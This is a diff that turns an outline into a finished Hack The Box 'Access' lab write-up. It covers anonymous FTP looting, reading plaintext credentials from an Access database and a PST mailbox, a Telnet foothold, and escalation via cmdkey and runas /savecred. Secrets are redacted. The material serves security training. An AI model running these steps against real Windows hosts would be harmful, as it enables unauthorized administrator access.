@@ -2,166 +2,355 @@
   <img src="../../assets/branding/nu11s3c-banner.svg" alt="nu11s3c security writeups" width="100%" />
 </p>
 
-# Access — Hack The Box
+# access - hack the box
 
-> [!IMPORTANT]
-> **Author's writing outline — not a finished writeup.** Replace prompts with your own explanation before marking complete. No passwords, flags or raw loot should be published.
-
-**Platform:** Hack The Box · retired machine  
-**OS:** Windows Server 2008 R2 Standard, x64 (build 7600)  
-**Outcome:** User foothold, user flag, elevated local Administrator execution and Administrator-level objective  
-**Focus:** FTP troubleshooting · Microsoft Access database inspection · encrypted ZIP / PST · Telnet · Windows Credential Manager
-
-**Navigation:** [Recon](#01--recon) · [Artifact analysis](#02--artifact-analysis) · [Initial access](#03--initial-access) · [Escalation](#04--privilege-escalation) · [Lessons](#05--lessons-learned)
+**platform:** Hack The Box · retired machine  
+**os:** Windows Server 2008 R2 Standard, x64 (build 7600)  
+**outcome:** User foothold, user flag, elevated local Administrator execution and Administrator-level objective  
+**focus:** FTP troubleshooting · Microsoft Access database inspection · encrypted ZIP / PST · Telnet · Windows Credential Manager
 
 ---
 
-## `00 / Overview`
+## `00 / overview`
 
-**Write in your own voice:**
-- [ ] In 2–4 sentences, introduce the target, scope and objective.
-- [ ] Explain why this box was useful for practicing evidence-based CPTS methodology.
-- [ ] Decide whether a restrained joke is useful at a real turning point.
+`Access` was an easy box that I chose as my first portfolio write-up and as a warm-up for my CPTS preparation. It was quite outdated, running Windows Server 2008 R2 with telnet still enabled.
 
-**Source:** Your private Access CherryTree notebook and HTB completion record (not uploaded here).
+### prep
 
-## `01 / Recon`
+after completing the box, I started tightening up my engagement workflow with tmux logging and fish environment variables. I also settled on a directory structure I wanted to keep using. I also configured pass as a gpg protected credential store.
 
-### Initial service discovery
+**directory structure:**
 
-- [ ] Describe `nmap -sVC -oA scans/initial $IP`, including that the default scan covered 1,000 common TCP ports, not a full TCP range.
-- [ ] Present the three discovered ports, their service versions, and the anonymous FTP result.
-- [ ] Explain why FTP received priority, but why you kept Telnet and HTTP on your attack-surface list.
-- [ ] Note the contrast between the external scan and later local SMB listeners; a listening socket isn't necessarily remotely reachable.
-
-| Port | Service | Initial observation |
-|---:|---|---|
-| 21/tcp | Microsoft FTP | Anonymous login allowed; passive data connection failed |
-| 23/tcp | Microsoft Telnet | Interactive login service |
-| 80/tcp | Microsoft IIS 7.5 | MegaCorp web page |
-
-**Evidence prompt:** Excerpt of `scans/initial.nmap` showing FTP `230` and `425`, and the other open ports.
-
-### FTP — active versus passive mode
-
-- [ ] Explain the FTP control/data channel distinction and why passive-mode failure did **not** contradict successful anonymous login.
-- [ ] Describe your active-mode verification and the successful server-initiated data connection.
-- [ ] Name both exposed directories, `Backups` and `Engineer`; explain which file types made them promising.
-- [ ] Discuss the remote path and whitespace problems, and why re-downloading binary artifacts using binary mode mattered.
-
-```bash
-# Connection-mode validation
-curl -v --ftp-port - "ftp://$IP/"
+```shell
+Access/
+├── env.fish          
+├── scans/                
+├── loot/                 
+├── notes/                
+├── screenshots/          
+└── report/
 ```
 
-**Evidence prompt:** A concise listing showing `backup.mdb` and `Access Control.zip`. Avoid dumping the entire FTP transcript.
+**fish and tmux environment variables**
 
-## `02 / Artifact analysis`
+tmux is configured to save logs to the engagement folder based on an environment variable, and fails closed if the directory isn't set. new panes inherit the session environment.
 
-### Database triage
+```shell
+# New logging destination
+set -gx ENGAGEMENT_DIR (pwd -P)
 
-- [ ] Describe how `file` established the Microsoft Access database format.
-- [ ] Explain why listing tables and inspecting schemas beats blindly dumping an unknown database.
-- [ ] Identify relevant tables and their record counts: `auth_user` = 3; `SECURITYDETAILS` = 0; `USERINFO` = 5.
-- [ ] Explain why `auth_user` was prioritized: username, password, status, role, last-login fields.
-- [ ] Describe observing plaintext application credentials without putting their values in the public article.
-- [ ] Separate confirmed plaintext storage from unverified assumptions about Windows credential validity.
+# Engagement configuration
+set -gx ENGAGEMENT "Access"
+set -gx IP "<TARGET_IP>"
 
-```bash
-file backup.mdb
-mdb-tables -1 backup.mdb
-mdb-schema -T auth_user backup.mdb
-mdb-count backup.mdb auth_user
-# Review CSV only in your private working directory.
-mdb-export backup.mdb auth_user
+# Copy to tmux session
+if set -q TMUX
+	set -l session (tmux display-message -p '#S')
+
+	tmux set-environment -t "$session" ENGAGEMENT_DIR "$ENGAGEMENT_DIR"
+	tmux set-environment -t "$session" ENGAGEMENT "$ENGAGEMENT"
+	tmux set-environment -t "$session" IP "$IP"
+end
 ```
 
-**Evidence prompt:** The relevant `auth_user` schema and a redacted table excerpt with the password column replaced with `[REDACTED]`.
-
-### Encrypted archive and Outlook mailbox
-
-- [ ] Explain what `unzip`'s unsupported method `99` revealed about WinZip AES encryption.
-- [ ] Show why an archive can expose its filenames even when file contents are encrypted.
-- [ ] Write about the hypothesis connecting the engineer account and the protected ZIP, identifying what evidence supported testing it.
-- [ ] Contrast `7z t` (test) with `7z x` (extract), including the earlier zero-byte PST and valid 271,360-byte extraction.
-- [ ] Describe parsing the PST with `readpst`, discovering an `mbox`, and interpreting the plain-text/HTML MIME variants as **one** email.
-- [ ] Summarize the email's relevant finding: a credential for the `security` account. Do not reproduce the plaintext password.
-
-```bash
-file 'Access Control.zip'
-7z l -slt 'Access Control.zip'
-7z t 'Access Control.zip'                   # password prompt
-7z x 'Access Control.zip' -opst_extracted
-readpst -r -o pst_mail 'Access Control.pst'
+```fish
+# From the Access directory:
+source ./env.fish
+ip route get $IP
 ```
 
-**Evidence prompt:** Sanitized ZIP metadata; email sender/subject/date and a redacted credential statement.
-
-## `03 / Initial access`
-
-- [ ] Explain why Telnet was a logical *targeted* validation point after the mailbox discovery.
-- [ ] Document the successful login as `security` without including the password.
-- [ ] Show the command prompt, `whoami` and the relevant portions of `whoami /groups`.
-- [ ] Explain the meaning of `BUILTIN\\Users` and a medium-integrity token.
-- [ ] Note that the user flag was retrieved, omitting its contents.
-- [ ] Distinguish finding a credential from proving authentication and obtaining an interactive foothold.
-
-```cmd
-whoami
-whoami /groups
-whoami /priv
-```
-
-**Evidence prompt:** Redacted Telnet banner, account context, and a confirmation that the user's Desktop objective was found.
-
-## `04 / Privilege escalation`
-
-### Enumeration and decision-making
-
-- [ ] Explain what `systeminfo` established about Windows Server 2008 R2 and patch information without asserting a kernel exploit.
-- [ ] Mention the blocked `wmic product` command briefly as a genuine dead end.
-- [ ] Explain why the ordinary `SeChangeNotifyPrivilege` and `SeIncreaseWorkingSetPrivilege` did not offer a strong escalation hypothesis.
-- [ ] Describe the decisive result from `cmdkey /list`: stored `ACCESS\\Administrator` credential.
-
-```cmd
-cmdkey /list
-```
-
-### Credential Manager → elevated execution
-
-- [ ] Explain the hypothesis behind `runas /savecred`.
-- [ ] Describe executing a harmless identity check as a new process and redirecting its output to a file.
-- [ ] Explain why the original Telnet session remained `security`.
-- [ ] Walk through proof of escalation: `ACCESS\\Administrator`, RID `500`, enabled `BUILTIN\\Administrators`, and **High Mandatory Level**.
-- [ ] Explain why privileges marked `Disabled` in an elevated token do not invalidate administrative execution.
-- [ ] Describe listing the Administrator Desktop and accessing the final objective without sharing the flag contents.
-
-```cmd
-runas /savecred /user:ACCESS\Administrator "cmd /c whoami > C:\Users\security\Documents\admin-check.txt"
-type C:\Users\security\Documents\admin-check.txt
-```
-
-**Evidence prompt:** `cmdkey /list`, `whoami /all` (selected lines), and redacted `root.txt` existence/access proof.
-
-## `05 / Lessons learned`
-
-**Prompts for your own technical reflection:**
-- [ ] What would have happened if you trusted Nmap's passive FTP error and moved on?
-- [ ] Why was file identification and schema triage more efficient than random guessing?
-- [ ] How did the artifacts form a connected sequence of hypotheses rather than separate loot?
-- [ ] Why was `cmdkey /list` more useful here than hunting speculative Windows kernel exploits?
-- [ ] How did you establish **effective** admin rights, not just a different username?
-- [ ] Which false start would make a worthwhile short joke or meme caption?
-- [ ] What one additional step belongs on your next Windows enumeration checklist?
-
-**TTPs:** Anonymous FTP · Active FTP · MDB Tools · WinZip AES · PST parsing · Telnet · Credential Manager · `runas /savecred` · Windows token inspection
-
-## `06 / References`
-
-- [HTB publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
-- [Microsoft — runas](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))
-- [Microsoft — cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
 
 ---
 
-<sub>nu11s3c // Retired lab; no flags, reusable credentials, or original loot published.</sub>
+## `01 / recon`
+
+### service discovery
+
+launched the standard nmap port and service scan. FTP, Telnet and a webserver were present. Decided FTP would be the priority, looking for possible credentials that could then be leveraged via telnet.
+
+```fish
+nmap -sVC -oA scans/initial $IP
+```
+
+**selected scan output from my notes:**
+
+```text
+21/tcp open ftp Microsoft ftpd
+ftp-anon: Anonymous FTP login allowed (230)
+Can't get directory listing: PASV failed: 425 Cannot open data connection
+```
+
+|   port | service           | observation                                             |
+| -----: | ----------------- | ------------------------------------------------------- |
+| 21/tcp | Microsoft FTP     | Anonymous login allowed; passive data connection failed |
+| 23/tcp | Microsoft Telnet  | Interactive login service                               |
+| 80/tcp | Microsoft IIS 7.5 | MegaCorp web page                                       |
+
+### ftp 
+
+connected to the ftp server to investigate. was able to use anonymous login exposing two directories, `Backups` & `Engineer`. 
+
+```console
+$ ftp $IP
+220 Microsoft FTP Service
+Name: anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+230 User logged in.
+ftp> dir
+425 Cannot open data connection.
+```
+
+the login worked, but passive listing didn't. active ftp worked instead:
+
+```console
+$ curl -v --ftp-port - "ftp://$IP/"
+200 EPRT command successful
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+```
+
+```text
+08-23-18  08:16PM       <DIR>          Backups
+08-24-18  09:00PM       <DIR>          Engineer
+```
+
+I downloaded two files: `backup.mdb` & `Access Control.zip`.
+
+```text
+ftp> get "Engineer\Access Control.zip"
+WARNING! 45 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+
+ftp> binary
+200 Type set to I.
+ftp> get "Engineer\Access Control.zip"
+226 Transfer complete.
+10870 bytes received.
+
+ftp> cd Backups
+250 CWD command successful.
+ftp> get backup.mdb
+226 Transfer complete.
+5652480 bytes received.
+```
+
+
+---
+
+## `02 / artifact analysis`
+
+### database
+
+`file` identified the backup as a Microsoft Access database, and the zip as an encrypted archive. I used mdb-tools to look through the database. `auth_user` stood out. 
+
+```console
+❯ file -- *
+Access Control.zip: Zip archive data, made by v2.0, extract using at least v2.0, ... method=AES Encrypted
+backup.mdb:         Microsoft Access Database
+
+❯ mdb-tables -1 backup.mdb
+acc_antiback
+acc_door
+...
+auth_user
+auth_user_groups
+...
+SECURITYDETAILS
+...
+USERINFO
+```
+
+`auth_user` included usernames, passwords and role information. There were three records in that table. The passwords were stored in plaintext, including an engineer account.
+
+```console
+❯ mdb-schema -T auth_user backup.mdb
+
+CREATE TABLE [auth_user]
+ (
+    [id]           Long Integer,
+    [username]     Text (50),
+    [password]     Text (50),
+    [Status]       Long Integer,
+    [last_login]   DateTime,
+    [RoleID]       Long Integer,
+    [Remark]       Memo/Hyperlink (255)
+ );
+```
+
+```console
+❯ mdb-count backup.mdb auth_user
+3
+❯ mdb-count backup.mdb SECURITYDETAILS
+0
+❯ mdb-count backup.mdb USERINFO
+5
+
+❯ mdb-export backup.mdb auth_user | head -n 1
+id,username,password,Status,last_login,RoleID,Remark
+```
+
+### encrypted archive and outlook mailbox
+
+the zip contained an Outlook PST file, `unzip` couldn't extract it because of the AES encryption. I switched to 7z, tested the creds from the database, and  extracted the archive.
+
+```console
+❯ 7z l -slt Access\ Control.zip
+Path = Access Control.pst
+Size = 271360
+Packed Size = 10678
+Encrypted = +
+Method = AES-256 Deflate:Maximum
+
+❯ unzip Access\ Control.zip
+Archive:  Access Control.zip
+   skipping: Access Control.pst      unsupported compression method 99
+
+❯ 7z t Access\ Control.zip
+Enter password (will not be echoed):
+Everything is Ok
+Size:       271360
+Compressed: 10870
+```
+
+I initially ended up with a zero byte PST file, so I re-extracted into a separate directory. I used `readpst` to convert it into a mailbox I could read.
+
+```console
+❯ 7z x Access\ Control.zip -opst_extracted/
+Enter password (will not be echoed):
+Everything is Ok
+
+❯ file 'Access Control.pst'
+Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), ... 271360 bytes
+
+❯ readpst -r -o ../pst_mail 'Access Control.pst'
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+    "Access Control" - 2 items done, 0 items skipped.
+
+❯ file mbox
+mbox: Mailbox text, 1st line "From "john@megacorp.com" Thu Aug 23 19:44:07 2018"
+```
+
+the mailbox included a message about a `security` account, a likely set of creds for telnet.
+
+```text
+From: john@megacorp.com <john@megacorp.com>
+Subject: MegaCorp Access Control System "security" account
+Date: Thu, 23 Aug 2018 23:44:07 +0000
+
+[message body and password redacted]
+```
+
+
+---
+
+## `03 / initial access`
+
+telnet accepted the creds and dropped me into cmd prompt. confirmed the account and checked its group memberships and privileges.
+
+```console
+❯ telnet $IP 23
+Connected to [HTB_TARGET_IP].
+Welcome to Microsoft Telnet Service
+
+login: security
+password: [REDACTED]
+
+C:\Users\security>whoami
+access\security
+```
+
+```cmd
+C:\Users\security>whoami /priv
+
+Privilege Name                Description                     State
+SeChangeNotifyPrivilege       Bypass traverse checking        Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+```text
+ACCESS\TelnetClients
+BUILTIN\Users
+Mandatory Label\Medium Mandatory Level
+```
+
+obtained the user flag.
+
+
+---
+
+## `04 / privilege escalation`
+
+### local enumeration
+
+ran `systeminfo` and the usual account and privilege checks. host was running Windows Server 2008 R2 Standard, build 7600. 
+
+```cmd
+C:\Users\security>systeminfo
+Host Name:                 ACCESS
+OS Name:                   Microsoft Windows Server 2008 R2 Standard
+OS Version:                6.1.7600 N/A Build 7600
+OS Configuration:          Standalone Server
+System Type:               x64-based PC
+
+C:\Users\security>wmic product get name,version
+This program is blocked by group policy. For more information, contact your system administrator.
+```
+
+eventually checked stored credentials with `cmdkey /list`. It showed a saved credential for `ACCESS\Administrator`.
+
+```cmd
+C:\Users\security>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+                                                       Type: Domain Password
+    User: ACCESS\Administrator
+```
+
+### saved credentials and runas
+
+`cmdkey` doesn't reveal the password itself, just that Windows has a credential stored for that account. The `/savecred` option with `runas` allows Windows to reuse credentials already saved by the current user. In this case that meant I could start a new process as Administrator without knowing the password.
+
+I didn't need a reverse shell for this box. Instead I used `runas` to write the results of `whoami` into files that my `security` session could read. The Telnet shell stayed as `security`; it was the new process that ran under the Administrator account.
+
+```cmd
+C:\Users\security>runas /savecred /user:ACCESS\Administrator "cmd /c whoami > C:\Users\security\Documents\admin-check.txt"
+
+C:\Users\security>dir Documents
+11/12/2026  06:01 PM                22 admin-check.txt
+
+C:\Users\security>runas /savecred /user:ACCESS\Administrator "cmd /c whoami /all >c:\users\security\documents\admin-token.txt"
+
+C:\Users\security\Documents>type admin-token.txt
+```
+
+```text
+USER INFORMATION
+User Name            SID
+access\administrator S-1-5-21-[HOST_SID_REDACTED]-500
+
+GROUP INFORMATION
+BUILTIN\Administrators                 Enabled group
+Mandatory Label\High Mandatory Level   Enabled group
+```
+
+the token showed RID 500, enabled membership in the Administrators group, and high integrity. That confirmed the new process was executing with the Administrator context.
+
+I used the same method to check the Administrator Desktop and reach the root-level objective.
+
+```cmd
+C:\Users\security\Documents>runas /savecred /user:ACCESS\Administrator "cmd /c dir C:\Users\Administrator\Desktop > C:\Users\Security\Documents\admin-desktop.txt"
+
+C:\Users\security\Documents>type admin-desktop.txt
+```
+
+```text
+Directory of C:\Users\Administrator\Desktop
+11/12/2026  12:50 AM                34 root.txt
+```
+
+---
+
+<sub>nu11s3c // retired lab; no flags, reusable credentials, or original loot published.</sub>
